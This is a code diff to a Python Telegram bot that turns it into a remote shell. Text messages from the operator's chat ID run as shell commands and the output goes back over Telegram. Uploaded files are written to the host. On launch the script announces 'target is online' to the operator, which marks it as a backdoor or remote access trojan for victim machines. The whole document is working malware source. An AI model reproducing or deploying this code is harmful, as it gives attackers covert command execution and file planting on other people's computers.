@@ -4,6 +4,9 @@ import tg # 导入token,id
 import telepot,requests
 import pprint # debug
 import os
+import time
+from telepot.loop import MessageLoop
+import subprocess
 
 token = tg.token	# token='nnnnnnnnn:nnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnn'
 known_ids = [tg.id]	# known_ids=['nnnnnnnnn']
@@ -11,21 +14,11 @@ known_ids = [tg.id]	# known_ids=['nnnnnnnnn']
 def checkchat_id(chat_id):
 	return len(known_ids) == 0 or str(chat_id) in known_ids
 	
-def split_string(n, st):
-	lst = ['']
-	for i in str(st):
-		l = len(lst) - 1
-		if len(lst[l]) < n:
-			lst[l] += i
-		else:
-			lst += [i]
-	return lst
-	
 def send_message(bot, chat_id, message):
 	try:
-		pprint.pprint(bot.sendMessage(chat_id, message))
+		bot.sendMessage(chat_id, message)
 	except Exception as err:
-		print "[!] Error sending message: %s" % str(err)
+		print("[!] Error sending message: %s" % str(err))
 	return
 	
 def get_file(bot,file_id,filename):
@@ -38,20 +31,38 @@ def handle(msg):
 		response =''
 		file_name = ''
 		file_id = None
-		print(content_type)
+		print(content_type, chat_type, chat_id)
 		# pprint.pprint(msg)
 		if content_type == 'text':
-			received_command = msg['text']
+			command = msg['text']
+			if command != '':
+				bot.sendChatAction(chat_id, 'typing')
+				message = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE,stderr=subprocess.STDOUT).stdout.read()
+				response = message.decode('gbk')
 		elif content_type == 'document':
 			file_id = msg['document']['file_id']
 			file_name = msg['document']['file_name']
 			get_file(bot,file_id,file_name)
+			bot.sendChatAction(chat_id, 'upload_document')
 			response = 'File saved as ' + file_name
 		if response != '':
-			responses = split_string(4096, response)
-			for resp in responses:
-				send_message(bot,chat_id,resp)
+			if len(response)-1<4096:
+				print(response)
+				send_message(bot,chat_id,response)
+			else:
+				with open("output.txt","w") as f:
+					f.write(response)
+				bot.sendDocument(chat_id, open('output.txt', 'rb'))
+				os.remove('output.txt')
+				send_message(bot,chat_id,"太长了！！！")
+		else:
+			send_message(bot,chat_id,"无可奉告！")
 bot = telepot.Bot(token)
-bot.message_loop(handle)
+MessageLoop(bot,handle).run_as_thread()
+if len(known_ids) > 0:
+	for known_id in known_ids:
+		sayhi="目标已上线"
+		send_message(bot, known_id, sayhi)
+print('Listening ...')
 while True:
 	time.sleep(10)
